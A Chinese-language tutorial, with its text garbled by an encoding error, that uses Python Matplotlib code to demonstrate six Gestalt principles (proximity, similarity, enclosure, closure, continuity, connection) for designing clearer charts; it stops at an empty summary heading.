pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ•°æ®åˆ†æä¸­ï¼Œæˆ‘ä»¬å¸¸è¯´ï¼šâ€œä¸€å¼ å¥½çš„å›¾è¡¨èƒœè¿‡åƒè¨€ä¸‡è¯­ã€‚â€</p>
<p>ä½†å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬åšå‡ºæ¥çš„å›¾è¡¨å´æ˜¯â€œåƒè¨€ä¸‡è¯­å µåœ¨å¿ƒå£éš¾å¼€â€ã€‚è¯»è€…çœ‹äº†åŠå¤©ï¼ŒæŠ“ä¸ä½é‡ç‚¹ã€‚</p>
<p>è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p>
<p>å› ä¸ºäººç±»çš„è§†è§‰æ„ŸçŸ¥éµå¾ªä¸€å¥—è¢«ç§°ä¸º <strong>æ ¼å¼å¡”ï¼ˆGestaltï¼‰</strong> çš„å¿ƒç†å­¦åŸç†ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œå½“æˆ‘ä»¬çœ‹åˆ°ä¸€ç»„ç‰©ä½“æ—¶ï¼Œå¤§è„‘ä¼šè‡ªåŠ¨å°†å®ƒä»¬è§†ä¸ºä¸€ä¸ªæ•´ä½“æˆ–ä¸€ç§æ¨¡å¼ï¼Œè€Œä¸æ˜¯å­¤ç«‹çš„ç¢ç‰‡ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ç”¨ <code>Python</code> çš„ <code>Matplotlib</code> åº“ï¼Œæ¥æ¼”ç¤º <strong>æ ¼å¼å¡”ï¼ˆGestaltï¼‰</strong> å¿ƒç†å­¦ä¸­çš„ 6 ä¸ªæ ¸å¿ƒåŸç†ï¼Œçœ‹çœ‹å¦‚ä½•åˆ©ç”¨è¿™äº›åŸç†â€œæ§åˆ¶â€è¯»è€…çš„æ³¨æ„åŠ›ã€‚</p>
<h2 data-id="heading-0">1. é‚»è¿‘åŸç†ï¼šè·ç¦»äº§ç”Ÿâ€œå…³ç³»â€</h2>
<p><strong>é‚»è¿‘åŸç†</strong>å°±æ˜¯è·ç¦»è¶Šè¿‘ï¼Œå…³ç³»è¶Šäº²ï¼Œæˆ‘ä»¬çš„å¤§è„‘ä¼šè‡ªåŠ¨æŠŠé å¾—è¿‘çš„ç‰©ä½“å½’ä¸ºä¸€ç±»ã€‚</p>
<p>å°±åƒåœ¨ä¸€ä¸ªæ´¾å¯¹ä¸Šï¼Œç«™åœ¨ä¸€èµ·èŠå¤©çš„å‡ ä¸ªäººï¼Œä½ ä¼šä¸‹æ„è¯†è§‰å¾—ä»–ä»¬æ˜¯ä¸€ä¼™çš„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é‚»è¿‘åŸç†</span>
<span class="hljs-comment"># åˆ›å»ºæµ‹è¯•æ•°æ®</span>
np.random.seed(<span class="hljs-number">42</span>)
data_a = np.random.normal(<span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">30</span>)
data_b = np.random.normal(<span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">30</span>)
data_c = np.random.normal(<span class="hljs-number">15</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">30</span>)

<span class="hljs-comment"># ä¸ä½¿ç”¨é‚»è¿‘åŸç†</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># å·¦ä¾§ï¼šæœªåº”ç”¨é‚»è¿‘åŸç†ï¼ˆæ‰€æœ‰ç‚¹å‡åŒ€åˆ†å¸ƒï¼‰</span>
all_data = np.concatenate([data_a, data_b, data_c])
x_positions = np.arange(<span class="hljs-number">90</span>)
ax1.scatter(x_positions, all_data, alpha=<span class="hljs-number">0.7</span>)
ax1.grid(<span class="hljs-literal">True</span>, alpha=<span class="hljs-number">0.3</span>)

<span class="hljs-comment"># å³ä¾§ï¼šåº”ç”¨é‚»è¿‘åŸç†ï¼ˆæŒ‰ç»„èšé›†ï¼‰</span>
<span class="hljs-keyword">for</span> i, (data, x_offset) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>([data_a, data_b, data_c], [<span class="hljs-number">0</span>, <span class="hljs-number">30</span>, <span class="hljs-number">60</span>])):
    x_positions = np.arange(<span class="hljs-built_in">len</span>(data)) + x_offset
    ax2.scatter(x_positions, data, alpha=<span class="hljs-number">0.7</span>, label=<span class="hljs-string">f'ç»„<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>'</span>)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7994223b73b44bd69c19be71c0446590~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=FAXc5HD3ZtjV4HIJcV2DMDqDEYo%3D" alt="" loading="lazy"/></p>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼šå°†ç›¸å…³çš„æ•°æ®ç‚¹æˆ–å…ƒç´ æ”¾åœ¨é è¿‘çš„ä½ç½®ï¼Œå¯ä»¥è®©è§‚ä¼—è‡ªç„¶åœ°ç†è§£å®ƒä»¬å±äºåŒä¸€ç±»åˆ«æˆ–å…·æœ‰æŸç§å…³è”ã€‚</p>
<h2 data-id="heading-1">2. ç›¸ä¼¼åŸç†ï¼šç›¸ä¼¼çš„â€œæ€§æ ¼â€å¸å¼•</h2>
<p><strong>ç›¸ä¼¼åŸç†</strong>å°±æ˜¯é•¿å¾—åƒçš„ï¼Œå°±æ˜¯ä¸€å®¶äººï¼Œå½“ç‰©ä½“åœ¨é¢œè‰²ã€å½¢çŠ¶æˆ–å¤§å°ä¸Šç›¸ä¼¼æ—¶ï¼Œå¤§è„‘ä¼šå°†å®ƒä»¬åˆ†ä¸ºä¸€ç»„ã€‚</p>
<p>æ¯”å¦‚åœ¨è¶³çƒåœºä¸Šï¼Œç©¿ç€ç›¸åŒé¢œè‰²çƒè¡£çš„äººï¼Œä½ ä¸éœ€è¦çœ‹æ¸…ä»–ä»¬çš„è„¸ï¼Œå°±çŸ¥é“ä»–ä»¬æ˜¯é˜Ÿå‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç›¸ä¼¼åŸç†</span>
<span class="hljs-comment"># åˆ›å»ºæµ‹è¯•æ•°æ®</span>
categories = [<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>]
values1 = [<span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">14</span>, <span class="hljs-number">18</span>, <span class="hljs-number">15</span>]
values2 = [<span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">10</span>]
x_pos = np.arange(<span class="hljs-built_in">len</span>(categories))

<span class="hljs-comment"># ç›¸ä¼¼åŸç†ç¤ºä¾‹</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># å·¦ä¾§ï¼šæœªåº”ç”¨ç›¸ä¼¼åŸç†ï¼ˆéšæœºé¢œè‰²å’Œæ ·å¼ï¼‰</span>
bars1 = ax1.bar(x_pos - <span class="hljs-number">0.2</span>, values1, <span class="hljs-number">0.4</span>, color=colors1, edgecolor=<span class="hljs-string">"black"</span>)
bars2 = ax1.bar(
    x_pos + <span class="hljs-number">0.2</span>, values2, <span class="hljs-number">0.4</span>, color=colors2, edgecolor=<span class="hljs-string">"black"</span>, hatch=hatches[<span class="hljs-number">0</span>]
)

<span class="hljs-comment"># ä¸ºæ¯ç»„æ¡å½¢æ·»åŠ ä¸åŒå›¾æ¡ˆ</span>
<span class="hljs-keyword">for</span> i, bar <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(bars2):
    bar.set_hatch(hatches[i % <span class="hljs-built_in">len</span>(hatches)])

<span class="hljs-comment"># å³ä¾§ï¼šåº”ç”¨ç›¸ä¼¼åŸç†ï¼ˆä¸€è‡´çš„é¢œè‰²å’Œæ ·å¼ï¼‰</span>
ax2.bar(x_pos - <span class="hljs-number">0.2</span>, values1, <span class="hljs-number">0.4</span>, color=<span class="hljs-string">"skyblue"</span>, edgecolor=<span class="hljs-string">"black"</span>, label=<span class="hljs-string">"æ•°æ®é›†1"</span>)
ax2.bar(
    x_pos + <span class="hljs-number">0.2</span>, values2, <span class="hljs-number">0.4</span>, color=<span class="hljs-string">"lightcoral"</span>, edgecolor=<span class="hljs-string">"black"</span>, label=<span class="hljs-string">"æ•°æ®é›†2"</span>
)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0105a0f7fc74eeeae52baee13d0176c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=7fP2ieZ2i1YmhUOl0BYY7ELjV5o%3D" alt="" loading="lazy"/></p>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼šä½¿ç”¨ä¸€è‡´çš„é¢œè‰²ã€å½¢çŠ¶æˆ–æ ·å¼æ¥è¡¨ç¤ºç›¸åŒç±»å‹çš„æ•°æ®ï¼Œå¯ä»¥å¤§å¤§é™ä½è§‚ä¼—çš„è®¤çŸ¥è´Ÿæ‹…ã€‚</p>
<h2 data-id="heading-2">3. åŒ…å›´åŸç†ï¼šè¾¹ç•Œåˆ›é€ "å½’å±æ„Ÿ"</h2>
<p>åŒ…å›´åŸç†å°±æ˜¯æœ‰å›´å¢™çš„åœ°æ–¹å°±æ˜¯å®¶ã€‚å¦‚æœåœ¨æŸäº›ç‰©ä½“å‘¨å›´åŠ ä¸Šè¾¹ç•Œæˆ–èƒŒæ™¯è‰²ï¼Œå®ƒä»¬å°±è¢«è§†ä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç¾¤ä½“ã€‚</p>
<p>è¿™ä¸ªåŸç†ç”šè‡³æ¯” <strong>â€œé‚»è¿‘â€</strong> å’Œ <strong>â€œç›¸ä¼¼â€</strong> æ›´å¼ºå¤§ã€‚</p>
<p>æ¯”å¦‚ï¼Œè‰åœ°ä¸Šæ•£è½ç€ç¾Šç¾¤ï¼Œä¸€æ—¦ä½ ç”¨æ …æ åœˆä½å…¶ä¸­å‡ åªï¼Œå¤§å®¶å°±ä¼šè®¤ä¸ºè¿™å‡ åªæ˜¯è¢«ç‰¹åˆ«é€‰ä¸­çš„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŒ…å›´åŸç†</span>
<span class="hljs-comment"># åˆ›å»ºæµ‹è¯•æ•°æ®</span>
np.random.seed(<span class="hljs-number">42</span>)
x1 = np.random.normal(<span class="hljs-number">2</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)
y1 = np.random.normal(<span class="hljs-number">3</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)

x2 = np.random.normal(<span class="hljs-number">5</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)
y2 = np.random.normal(<span class="hljs-number">5</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)

<span class="hljs-comment"># åŒ…å›´åŸç†ç¤ºä¾‹</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># å·¦ä¾§ï¼šæœªåº”ç”¨åŒ…å›´åŸç†</span>
ax1.scatter(x1, y1, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"blue"</span>)
ax1.scatter(x2, y2, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"red"</span>)

<span class="hljs-comment"># å³ä¾§ï¼šåº”ç”¨åŒ…å›´åŸç†</span>
<span class="hljs-keyword">from</span> matplotlib.patches <span class="hljs-keyword">import</span> Ellipse

ax2.scatter(x1, y1, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"blue"</span>, label=<span class="hljs-string">"ç»„A"</span>)
ax2.scatter(x2, y2, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"red"</span>, label=<span class="hljs-string">"ç»„B"</span>)

<span class="hljs-comment"># æ·»åŠ åŒ…å›´åŒºåŸŸ</span>
ellipse1 = Ellipse((<span class="hljs-number">2</span>, <span class="hljs-number">3</span>), width=<span class="hljs-number">4</span>, height=<span class="hljs-number">3</span>, edgecolor=<span class="hljs-string">"blue"</span>)
ellipse2 = Ellipse((<span class="hljs-number">5</span>, <span class="hljs-number">5</span>), width=<span class="hljs-number">4</span>, height=<span class="hljs-number">3</span>, edgecolor=<span class="hljs-string">"red"</span>)

ax2.add_patch(ellipse1)
ax2.add_patch(ellipse2)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bb6639831414c0e809fcecbee0b4e24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=8MHBiGHfbZijkc%2BCxF8SxixW7LM%3D" alt="" loading="lazy"/></p>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼šä½¿ç”¨è¾¹ç•Œã€èƒŒæ™¯è‰²æˆ–å®¹å™¨å°†ç›¸å…³çš„æ•°æ®å…ƒç´ åŒ…å›´èµ·æ¥ï¼Œå¯ä»¥æ˜ç¡®åœ°å‘Šè¯‰è§‚ä¼—è¿™äº›å…ƒç´ å±äºåŒä¸€ç»„ã€‚</p>
<h2 data-id="heading-3">4. é—­åˆåŸç†ï¼šå¤§è„‘çš„"è‡ªåŠ¨è¡¥å…¨"</h2>
<p><strong>é—­åˆåŸç†</strong>å°±æ˜¯å¤§è„‘æ˜¯å¤©ç”Ÿçš„â€œè¡¥å›¾é«˜æ‰‹â€ã€‚å³ä½¿å›¾å½¢ä¸å®Œæ•´ï¼Œåªè¦æœ‰è¶³å¤Ÿçš„æç¤ºï¼Œå¤§è„‘ä¹Ÿä¼šè‡ªåŠ¨è„‘è¡¥å‡ºç¼ºå¤±çš„éƒ¨åˆ†ã€‚</p>
<p>æ¯”å¦‚çœ‹åˆ°ä¸€ä¸ªè™šçº¿ç”»åœ†ï¼Œä½ ä¸ä¼šè§‰å¾—é‚£æ˜¯æ–­æ–­ç»­ç»­çš„çº¿æ®µï¼Œä½ ä¼šç›´æ¥è¯´ï¼šâ€œè¿™æ˜¯ä¸€ä¸ªåœ†â€ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é—­åˆåŸç†ç¤ºä¾‹</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># åˆ›å»ºä¸€äº›ä¸å®Œæ•´çš„æ•°æ®ç‚¹</span>
np.random.seed(<span class="hljs-number">42</span>)
angles = np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>*np.pi, <span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># æ•…æ„å°‘ä¸€ä¸ªç‚¹å½¢æˆä¸é—­åˆ</span>
radii = np.random.uniform(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)
x = radii * np.cos(angles)
y = radii * np.sin(angles)

<span class="hljs-comment"># å·¦ä¾§ï¼šä¸å®Œæ•´çš„å½¢çŠ¶ï¼ˆæœªåˆ©ç”¨é—­åˆåŸç†ï¼‰</span>
ax1.plot(x, y, <span class="hljs-string">'o-'</span>, linewidth=<span class="hljs-number">2</span>, markersize=<span class="hljs-number">8</span>)

<span class="hljs-comment"># å³ä¾§ï¼šé—­åˆçš„å½¢çŠ¶ï¼ˆåº”ç”¨é—­åˆåŸç†ï¼‰</span>
<span class="hljs-comment"># æ·»åŠ ç¼ºå¤±çš„ç‚¹ä½¿å½¢çŠ¶é—­åˆ</span>
angles_closed = np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>*np.pi, <span class="hljs-number">7</span>)
radii_closed = np.append(radii, radii[<span class="hljs-number">0</span>])  <span class="hljs-comment"># å›åˆ°èµ·ç‚¹</span>
x_closed = radii_closed * np.cos(angles_closed)
y_closed = radii_closed * np.sin(angles_closed)

ax2.plot(x_closed, y_closed, <span class="hljs-string">'o-'</span>, linewidth=<span class="hljs-number">2</span>, markersize=<span class="hljs-number">8</span>)
ax2.fill(x_closed, y_closed, alpha=<span class="hljs-number">0.3</span>)  <span class="hljs-comment"># å¡«å……å¢å¼ºé—­åˆæ„Ÿ</span>

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d200716905554f469c66f2a43c03eee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=JBeEWYpHOa6kP51SiMF4S6O3oDc%3D" alt="" loading="lazy"/></p>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼šæˆ‘ä»¬ä¸éœ€è¦å±•ç¤ºæ¯ä¸€ä¸ªç»†èŠ‚ï¼Œå¯ä»¥åˆ©ç”¨è§‚ä¼—çš„è‡ªåŠ¨è¡¥å…¨èƒ½åŠ›æ¥ç®€åŒ–å›¾è¡¨ã€‚</p>
<p>ä½†è¦<strong>æ³¨æ„</strong>ï¼Œè¿‡äºä¸å®Œæ•´çš„å›¾å½¢å¯èƒ½å¯¼è‡´è¯¯è§£ã€‚</p>
<h2 data-id="heading-4">5. è¿ç»­åŸç†ï¼šæµç•…çš„"è§†è§‰è·¯å¾„"</h2>
<p><strong>è¿ç»­åŸç†</strong>å°±æ˜¯é¡ºè—¤æ‘¸ç“œã€‚æˆ‘ä»¬çš„è§†çº¿å€¾å‘äºè·Ÿéšå¹³æ»‘ã€è¿ç»­çš„è·¯å¾„ï¼Œè€Œä¸æ˜¯å‰§çƒˆæŠ˜çº¿æˆ–ä¸è§„åˆ™çš„æ’åˆ—ã€‚</p>
<p>æ¯”å¦‚æ’é˜Ÿæ—¶ï¼Œå¦‚æœé˜Ÿä¼å¼¯å¼¯æ›²æ›²ä½†æ¯ä¸ªäººéƒ½çœ‹ç€å‰ä¸€ä¸ªäººçš„åè„‘å‹ºï¼Œä½ çŸ¥é“è¿™è¿˜æ˜¯ä¸€æ¡é˜Ÿã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¿ç»­åŸç†ç¤ºä¾‹</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># åˆ›å»ºæ•°æ®</span>
np.random.seed(<span class="hljs-number">42</span>)
time = np.arange(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0.1</span>)
signal1 = np.sin(time) + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-built_in">len</span>(time))
signal2 = np.cos(time) + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-built_in">len</span>(time))

<span class="hljs-comment"># å·¦ä¾§ï¼šä¸è¿ç»­çš„å±•ç¤º</span>
ax1.plot(time[:<span class="hljs-number">50</span>], signal1[:<span class="hljs-number">50</span>], <span class="hljs-string">'b-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'ä¿¡å·A (ç¬¬ä¸€éƒ¨åˆ†)'</span>)
ax1.plot(time[<span class="hljs-number">70</span>:], signal1[<span class="hljs-number">70</span>:], <span class="hljs-string">'b--'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'ä¿¡å·A (ç¬¬äºŒéƒ¨åˆ†)'</span>)
ax1.plot(time[:<span class="hljs-number">40</span>], signal2[:<span class="hljs-number">40</span>], <span class="hljs-string">'r-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'ä¿¡å·B (ç¬¬ä¸€éƒ¨åˆ†)'</span>)
ax1.plot(time[<span class="hljs-number">60</span>:], signal2[<span class="hljs-number">60</span>:], <span class="hljs-string">'r--'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'ä¿¡å·B (ç¬¬äºŒéƒ¨åˆ†)'</span>)

<span class="hljs-comment"># å³ä¾§ï¼šè¿ç»­çš„å±•ç¤º</span>
ax2.plot(time, signal1, <span class="hljs-string">'b-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'ä¿¡å·A'</span>)
ax2.plot(time, signal2, <span class="hljs-string">'r-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'ä¿¡å·B'</span>)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd01873808c24a7784543b1773be36db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=SVy9%2F1zNOqAtA%2FcGFGuse2hz7Jw%3D" alt="" loading="lazy"/></p>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼šä¿æŒçº¿æ¡ã€å½¢çŠ¶æˆ–å…ƒç´ çš„è¿ç»­æ€§å¯ä»¥å¸®åŠ©è§‚ä¼—è¿½è¸ªæ•°æ®çš„å˜åŒ–è¶‹åŠ¿ã€‚åœ¨æŠ˜çº¿å›¾ã€é¢ç§¯å›¾ä¸­å°¤å…¶é‡è¦ã€‚</p>
<h2 data-id="heading-5">6. è¿æ¥åŸç†ï¼šçœ‹å¾—è§çš„"å…³ç³»çº¿"</h2>
<p><strong>è¿æ¥åŸç†</strong>å°±æ˜¯è—•æ–­ä¸è¿ã€‚è¢«çº¿è¿æ¥çš„ç‰©ä½“ï¼Œè¢«è§†ä¸ºå¼ºå…³è”ã€‚è¿™ä¸ªè§†è§‰ä¿¡å·æ¯”é¢œè‰²å’Œè·ç¦»éƒ½è¦å¼ºã€‚</p>
<p>æ¯”å¦‚ï¼Œä¸¤ä¸ªäººç«™å¾—å†è¿œï¼Œå¦‚æœæ‰‹é‡Œç‰µç€ä¸€æ ¹ç»³å­ï¼Œä½ ä¹Ÿä¼šè§‰å¾—ä»–ä»¬ä¿©åœ¨äº’åŠ¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¿æ¥åŸç†ç¤ºä¾‹ - æ•£ç‚¹å›¾ç‰ˆæœ¬</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># åˆ›å»ºæ•£ç‚¹æ•°æ®ï¼š4ä¸ªç›¸å…³ç‚¹é›†ï¼Œæ¯ä¸ªç‚¹é›†æœ‰5ä¸ªç‚¹</span>
np.random.seed(<span class="hljs-number">42</span>)
n_points = <span class="hljs-number">5</span>
n_groups = <span class="hljs-number">4</span>

<span class="hljs-comment"># ä¸ºæ¯ç»„ç”Ÿæˆç›¸å…³ç‚¹</span>
groups = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_groups):
    center_x = np.random.uniform(<span class="hljs-number">2</span>, <span class="hljs-number">8</span>)
    center_y = np.random.uniform(<span class="hljs-number">2</span>, <span class="hljs-number">8</span>)

    <span class="hljs-comment"># ç”Ÿæˆå›´ç»•ä¸­å¿ƒçš„ç›¸å…³ç‚¹</span>
    x_points = center_x + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>, n_points)
    y_points = center_y + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>, n_points)

    <span class="hljs-comment"># æ·»åŠ ä¸€äº›è¶‹åŠ¿</span>
    trend = np.random.uniform(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)
    y_points = y_points + trend * (x_points - center_x)

    groups.append((x_points, y_points))

<span class="hljs-comment"># å·¦ä¾§ï¼šæœªåº”ç”¨è¿æ¥åŸç†ï¼ˆç‹¬ç«‹çš„æ•£ç‚¹ï¼‰</span>
colors = [<span class="hljs-string">"blue"</span>, <span class="hljs-string">"red"</span>, <span class="hljs-string">"green"</span>, <span class="hljs-string">"orange"</span>]
markers = [<span class="hljs-string">"o"</span>, <span class="hljs-string">"s"</span>, <span class="hljs-string">"^"</span>, <span class="hljs-string">"D"</span>]

<span class="hljs-keyword">for</span> i, (x_points, y_points) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(groups):
    ax1.scatter(
        x_points,
        y_points,
        color=colors[i],
        marker=markers[i],
        alpha=<span class="hljs-number">0.7</span>,
        s=<span class="hljs-number">80</span>,
        label=<span class="hljs-string">f"æ•°æ®é›†<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>"</span>,
    )


<span class="hljs-comment"># å³ä¾§ï¼šåº”ç”¨è¿æ¥åŸç†ï¼ˆè¿æ¥ç›¸å…³æ•£ç‚¹ï¼‰</span>
<span class="hljs-keyword">for</span> i, (x_points, y_points) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(groups):
    <span class="hljs-comment"># é¦–å…ˆç»˜åˆ¶è¿æ¥çº¿</span>
    <span class="hljs-comment"># æŒ‰ç…§xå€¼æ’åºï¼Œä½¿è¿æ¥çº¿æ›´æœ‰åº</span>
    sorted_indices = np.argsort(x_points)
    sorted_x = x_points[sorted_indices]
    sorted_y = y_points[sorted_indices]

    ax2.plot(
        sorted_x,
        sorted_y,
        color=colors[i],
        linewidth=<span class="hljs-number">2</span>,
        alpha=<span class="hljs-number">0.5</span>,
        linestyle=<span class="hljs-string">"--"</span>,
        label=<span class="hljs-string">f"æ•°æ®é›†<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>è¶‹åŠ¿çº¿"</span>,
    )

    <span class="hljs-comment"># ç„¶åç»˜åˆ¶æ•£ç‚¹ï¼ˆåœ¨çº¿ä¸Šæ–¹ï¼Œé¿å…è¢«çº¿é®æŒ¡ï¼‰</span>
    ax2.scatter(
        x_points,
        y_points,
        color=colors[i],
        marker=markers[i],
        alpha=<span class="hljs-number">0.7</span>,
        s=<span class="hljs-number">80</span>,
        edgecolor=<span class="hljs-string">"black"</span>,
        linewidth=<span class="hljs-number">1</span>,
    )

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7648e82d42a24ef2a69bcbd596482497~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=Yw6hbJzkNmpPfA2pHE%2FsNMDP%2Fdw%3D" alt="" loading="lazy"/></p>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼šåœ¨æ•£ç‚¹å›¾ä¸­ï¼Œè¿æ¥ç›¸å…³æ•°æ®ç‚¹çš„çº¿å¯ä»¥å¸®åŠ©è§‚ä¼—è¯†åˆ«å‡ºæ•°æ®çš„æ¨¡å¼ã€è¶‹åŠ¿æˆ–åˆ†ç»„å…³ç³»ã€‚</p>
<p>è¿™å°±åƒåœ¨åœ°å›¾ä¸Šè¿æ¥å„ä¸ªåŸå¸‚æ¥æ˜¾ç¤ºæ—…è¡Œè·¯çº¿ä¸€æ ·ï¼Œä½¿ç›¸å…³çš„ç‚¹ä¹‹é—´å»ºç«‹äº†æ˜ç¡®çš„è§†è§‰è”ç³»ã€‚</p>
<h2 data-id="heading-6">7. æ€»ç»“</h2>
